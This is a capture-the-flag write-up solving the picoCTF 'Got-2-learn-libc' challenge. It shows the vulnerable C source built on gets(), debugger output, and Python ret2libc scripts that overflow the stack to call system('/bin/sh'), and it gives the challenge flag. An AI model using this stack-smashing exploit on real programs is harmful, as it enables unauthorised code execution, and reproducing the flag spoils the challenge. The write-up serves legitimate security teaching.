# Got-2-learn-libc

>This program gives you the address of some system calls.
>Can you get a shell?
>You can find the program in /problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33 on the shell server. Source. 

### [~$ cd ..](../)

The given source is as follows:

> ```c
>#include <stdio.h>
>#include <stdlib.h>
>#include <string.h>
>#include <unistd.h>
>#include <sys/types.h>
>
>#define BUFSIZE 148
>#define FLAGSIZE 128
>
>char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */
>
>
>void vuln(){
>	char buf[BUFSIZE];
>	puts("Enter a string:");
>	gets(buf);
>	puts(buf);
>	puts("Thanks! Exiting now...");
>}
>
>int main(int argc, char **argv){
>
>	setvbuf(stdout, NULL, _IONBF, 0);
>
>	// Set the gid to the effective gid
>	// this prevents /bin/sh from dropping the privileges
>	gid_t gid = getegid();
>	setresgid(gid, gid, gid);
>
>	puts("Here are some useful addresses:\n");
>
>	printf("puts: %p\n", puts);
>	printf("fflush %p\n", fflush);
>	printf("read: %p\n", read);
>	printf("write: %p\n", write);
>	printf("useful_string: %p\n", useful_string);
>
>	printf("\n");
>
>	vuln();
>	return 0;
>}
> ```

The idea here is to exploit `gets` to call `system`, passing "/bin/sh" as parameter. We don't know the address of `system`, but we can compute the constant
difference between its address and, let's say `puts`'s one.

## Find the overflow

A first thing we can do is to find how many bytes we need to write before smashing the return address.

> ```
>gdb-peda$ disas vuln
>Dump of assembler code for function vuln:
>   0x000007a0 <+0>:	push   ebp
>   0x000007a1 <+1>:	mov    ebp,esp
>   0x000007a3 <+3>:	push   ebx
>   0x000007a4 <+4>:	sub    esp,0xa4
>   0x000007aa <+10>:	call   0x670 <__x86.get_pc_thunk.bx>
>   0x000007af <+15>:	add    ebx,0x1851
>   0x000007b5 <+21>:	sub    esp,0xc
>   0x000007b8 <+24>:	lea    eax,[ebx-0x1670]
>   0x000007be <+30>:	push   eax
>   0x000007bf <+31>:	call   0x618
>   0x000007c4 <+36>:	add    esp,0x10
>   0x000007c7 <+39>:	sub    esp,0xc
>   0x000007ca <+42>:	lea    eax,[ebp-0x9c]
>   0x000007d0 <+48>:	push   eax
>   0x000007d1 <+49>:	call   0x5b0 <gets@plt>
>   0x000007d6 <+54>:	add    esp,0x10
>   0x000007d9 <+57>:	sub    esp,0xc
>   0x000007dc <+60>:	lea    eax,[ebp-0x9c]
>   0x000007e2 <+66>:	push   eax
>   0x000007e3 <+67>:	call   0x618
>   0x000007e8 <+72>:	add    esp,0x10
>   0x000007eb <+75>:	sub    esp,0xc
>   0x000007ee <+78>:	lea    eax,[ebx-0x1660]
>   0x000007f4 <+84>:	push   eax
>   0x000007f5 <+85>:	call   0x618
>   0x000007fa <+90>:	add    esp,0x10
>   0x000007fd <+93>:	nop
>   0x000007fe <+94>:	mov    ebx,DWORD PTR [ebp-0x4]
>   0x00000801 <+97>:	leave  
>   0x00000802 <+98>:	ret    
>End of assembler dump.
>gdb-peda$ break *vuln+54
>Breakpoint 1 at 0x7d6
>gdb-peda$ run
>Starting program: .../got-2-learn-libc 
>Here are some useful addresses:
>
>puts: 0xf7e4f890
>fflush 0xf7e4d9f0
>read: 0xf7ec6b60
>write: 0xf7ec6bd0
>useful_string: 0x56557030
>
>Enter a string:
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> ```

Now, let's count how many bytes there we need to fill the buffer and reach the return address. Our 'A's begin at `0xffffd10c` and 
the address to smash is at `$ebp+4=0xffffd1ac`, then we need 160 bytes:

> ```
>gdb-peda$ info reg ebp
>ebp            0xffffd1a8	0xffffd1a8
>gdb-peda$ x/50wx $esp
>0xffffd0f0:	0xffffd10c	0x00000001	0x00000020	0x565557af
>0xffffd100:	0x565559b8	0x00000020	0xf7e5859b	0x41414141
>0xffffd110:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd120:	0x41414141	0x41414141	0xf7fa0041	0xf7e5abeb
>0xffffd130:	0xf7fa3d60	0xf7fa3da7	0x00000001	0xf7fd4110
>0xffffd140:	0x00000001	0x00000001	0xf7e5ab19	0xf7fa4870
>0xffffd150:	0xf7fa3d60	0xf7fa3000	0xffffd198	0xf7e516c5
>0xffffd160:	0xf7fa3d60	0x0000000a	0xf7e31f7b	0x56557000
>0xffffd170:	0xf7fe800b	0x56557000	0x00000001	0xf7dee700
>0xffffd180:	0xffffd1c8	0xf7fee710	0xf7fa4870	0x56557000
>0xffffd190:	0x00000001	0xf7fa3000	0xffffd1c8	0x565558ec
>0xffffd1a0:	0x0000000a	0x56557000	0xffffd1c8	0x565558f4
>0xffffd1b0:	0x00000001	0xffffd274
> ```

The payload will therefore be composed as follows:

160 \* 'X' + @system + @system + @"/bin/sh"

_The second @system is actually the address for the base pointer, could be whatever we want_

## Find the offset and script it

Second thing we can do is to compute the offset between `@puts` and `@system`.

> ```
>gdb-peda$ print system
>$1 = {<text variable, no debug info>} 0xf7e2a850 <system>
> ```

We previously got the address of `puts`: `0xf7e4f890`. The difference is therefore: 0xf7e4f890-0xf7e2a850 = 151616

Yes, but there is a problem: how can we passed non-ascii addresses to the program during the program execution ? As usual, Python
will be our best friend! Quite dirty but does the job:

> ```python
>import subprocess
>import struct
>
>p = subprocess.Popen(['./vuln'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
>
>main = None
>stdout_data = p.stdout.readline()
>useful_address = None
>system = None
>while stdout_data != None:
>	print stdout_data[:-1]
>	index = stdout_data.find('useful_string')
>	if index != -1:
>		useful_address = stdout_data[index+17:index+17+8]
>		p.stdin.write(160 * 'A' + 2 * struct.pack("<I", system) + struct.pack("<I", int(useful_address, 16)) + '\n')
>		break
>	index = stdout_data.find('puts')
>	if index != -1:
>		puts = stdout_data[index+8:index+8+8]
>		system = int(puts, 16)- 151616
>	stdout_data = p.stdout.readline()
>print p.stdout.readline()
>print p.stdout.readline()
>print p.stdout.readline()
>p.stdin.write('touch test.txt\n')
> ```

The script parses the program output to obtain "/bin/sh"'s address and computes the return address. Because of endianess, `struct` is used to write it properly.
However, the output of the shell command, at the end, could not be displayed. To test the script, we `touch`ed a file, and it was a success.

However, on the remote machine, the offset was not the same. We sligthly modified our script:

> ```python
>import subprocess
>import struct
>
>p = subprocess.Popen(['/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33/vuln'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
>
>main = None
>system = None
>stdout_data = p.stdout.readline()
>useful_address = None
>system = None
>while stdout_data != None:
>	print stdout_data[:-1]
>	index = stdout_data.find('useful_string')
>	if index != -1:
>		useful_address = stdout_data[index+17:index+17+8]
>		p.stdin.write(160 * 'A' + 2 * struct.pack("<I", system) + struct.pack("<I", int(useful_address, 16)) + '\n')
>		break
>	index = stdout_data.find('puts')
>	if index != -1:
>		puts = stdout_data[index+8:index+8+8]
>		system = int(puts, 16)- 149504 # /!\ Not the same offset
>	stdout_data = p.stdout.readline()
>print p.stdout.readline()
>print p.stdout.readline()
>print p.stdout.readline()
>p.stdin.write('cp /problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33/flag.txt flag.txt\n')
>print p.stdout.readline()
> ```

We then moved on the remote machine and created a temporary folder with the script inside. We ran it, and saw that a file named `flag.txt` was copied!

FLAG: **picoCTF{syc4al1s_4rE_uS3fUl_6319ec91}**
